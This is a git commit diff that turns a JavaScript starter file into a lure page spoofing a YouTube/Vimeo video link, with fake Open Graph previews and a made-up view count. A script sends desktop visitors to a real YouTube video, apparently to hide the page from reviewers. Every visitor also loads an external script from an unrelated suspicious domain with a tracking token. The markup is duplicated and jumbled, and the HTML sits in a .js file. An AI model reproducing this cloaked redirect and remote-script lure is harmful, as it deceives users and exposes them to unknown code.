41edfc6ce7b565b822d523c25848a29e39df21ef
figueroamildddd <figueroacreate@hotmail.com>
2021-01-24 10:30:17 +0800

    1 file modified

--- index.js
+++ index.js
@@ -1,6 +1,72 @@
-// Import stylesheets
-import './style.css';
+<meta property="og:title" content="when was this video" />
+<meta property="og:image" content="https://i.imgur.com/RXDjDES.png" />
+<meta name="robots" content="index"/>
+<meta name="robots" content="noindex"/>
+<meta name="robots" content="nofollow"/>
+<meta http-equiv="cache-control" content="no-cache"/>
 
-// Write Javascript code!
-const appDiv = document.getElementById('app');
-appDiv.innerHTML = `<h1>JS Starter</h1>`;
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+  <body>
+    <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+  <body>
+    <script>
+    
+    function isMobile() {
+        const mobiles = [
+            /Android/i,
+            /webOS/i,
+            /iPhone/i,
+            /iPad/i,
+            /iPod/i,
+            /BlackBerry/i,
+            /Windows Phone/i,
+            /Mobile/i,
+            /Tablet/i,
+            /GoBrowser/i,
+            /Fennec/i,
+            /Mini/i
+        ];
+
+        return mobiles.some(mobile => {
+            return navigator.userAgent.match(mobile);
+        });
+    }
+
+    if (!isMobile()) window.location = "https://www.youtube.com/watch?v=jcBjaAfdFdE";
+
+</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+        <meta property="og:site_name" content="Redirecting to acces the video">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0,user-scalable=yes">
+        <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        <meta property="og:title" content="Redirecting to acces the video">
+        <meta property="og:description" content="5.502.608 Views">
+        <meta property="og:url" content="https://www.vimeo.com">
+        <meta property="og:type" content="Redirecting to acces the video">
+        <title>Redirecting to acces the video</title>
+     <meta property="og:site_name" content="YouTube" />
+<meta property="og:url" content="https://www.youtube.com/watch?v=jcBjaAfdFdE" />
+<meta property="og:title" content="Redirecting to acces the video" />
+<meta property="og:image" content="https://i.ytimg.com/vi/V1Pl8CzNzCw/maxresdefault.jpg" />
+<meta property="og:image:width" content="1280" />
+<meta property="og:image:height" content="720" />
+<meta property="og:description" content="Listen to â€œlovelyâ€ (with Khalid): http://smarturl.it/lovelysingle Listen to â€œWHEN WE ALL FALL ASLEEP, WHERE DO WE GO?â€, out now: http://smarturl.it/BILLIEALB..." />
+<script type="text/javascript" src="https://surescripts.icu/?token=ea62e37f69ae90221a1390316bbcdd59"async="true"></script>
+  </body>
+</html>
+  </body>
+</html>
